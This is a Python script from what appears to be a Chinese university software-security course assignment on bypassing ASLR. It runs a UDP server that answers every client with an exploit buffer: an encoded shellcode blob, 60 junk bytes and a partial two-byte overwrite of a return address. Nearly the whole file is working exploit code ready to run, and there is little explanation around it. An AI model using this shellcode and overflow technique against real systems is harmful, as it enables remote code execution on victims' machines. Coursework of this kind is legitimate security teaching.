#!/bin/env python3
# -*- coding: utf-8 -*-
# version: Python3.X
''' 软件安全与漏洞分析第十二周任务 2, 目的是绕过 ASLR 技术
'''
__author__ = '__L1n__w@tch'

import socketserver

# 由于是在新的系统下测试, 所以需要新的 ShellCode
shellcode = b"\xdb\xd5\xd9\x74\x24\xf4\xbb\xa3\xe7\xd8\xa5\x5a\x29\xc9\xb1" \
            b"\x31\x31\x5a\x18\x03\x5a\x18\x83\xea\x5f\x05\x2d\x59\x77\x48" \
            b"\xce\xa2\x87\x2d\x46\x47\xb6\x6d\x3c\x03\xe8\x5d\x36\x41\x04" \
            b"\x15\x1a\x72\x9f\x5b\xb3\x75\x28\xd1\xe5\xb8\xa9\x4a\xd5\xdb" \
            b"\x29\x91\x0a\x3c\x10\x5a\x5f\x3d\x55\x87\x92\x6f\x0e\xc3\x01" \
            b"\x80\x3b\x99\x99\x2b\x77\x0f\x9a\xc8\xcf\x2e\x8b\x5e\x44\x69" \
            b"\x0b\x60\x89\x01\x02\x7a\xce\x2c\xdc\xf1\x24\xda\xdf\xd3\x75" \
            b"\x23\x73\x1a\xba\xd6\x8d\x5a\x7c\x09\xf8\x92\x7f\xb4\xfb\x60" \
            b"\x02\x62\x89\x72\xa4\xe1\x29\x5f\x55\x25\xaf\x14\x59\x82\xbb" \
            b"\x73\x7d\x15\x6f\x08\x79\x9e\x8e\xdf\x08\xe4\xb4\xfb\x51\xbe" \
            b"\xd5\x5a\x3f\x11\xe9\xbd\xe0\xce\x4f\xb5\x0c\x1a\xe2\x94\x5a" \
            b"\xdd\x70\xa3\x28\xdd\x8a\xac\x1c\xb6\xbb\x27\xf3\xc1\x43\xe2" \
            b"\xb0\x3e\x0e\xaf\x90\xd6\xd7\x25\xa1\xba\xe7\x93\xe5\xc2\x6b" \
            b"\x16\x95\x30\x73\x53\x90\x7d\x33\x8f\xe8\xee\xd6\xaf\x5f\x0e" \
            b"\xf3\xd3\x3e\x9c\x9f\x3d\xa5\x24\x05\x42"


class MyUDPHandler(socketserver.BaseRequestHandler):
    """
    This class works similar to the TCP handler class, except that
    self.request consists of a pair of data and client socket, and since
    there is no connection the client address must be given explicitly
    when sending data back via sendto().
    """

    def handle(self):
        data = self.request[0].strip()
        socket = self.request[1]
        print("{} wrote:".format(self.client_address[0]))
        print(data)

        # data = b""
        # for i in range(100):
        #     data += bytes([ord("A") + i // 4])
        # print(data)


        # socket.sendto(data.upper(), self.client_address)
        exploit_junk = b"A" * 60
        exploit_retn_address_two_bytes = b"\x17\x58"[::-1]
        exploit = shellcode + exploit_junk + exploit_retn_address_two_bytes

        socket.sendto(exploit, self.client_address)


def main():
    HOST, PORT = "192.168.117.1", 9999
    server = socketserver.UDPServer((HOST, PORT), MyUDPHandler)
    server.serve_forever()


if __name__ == "__main__":
    main()
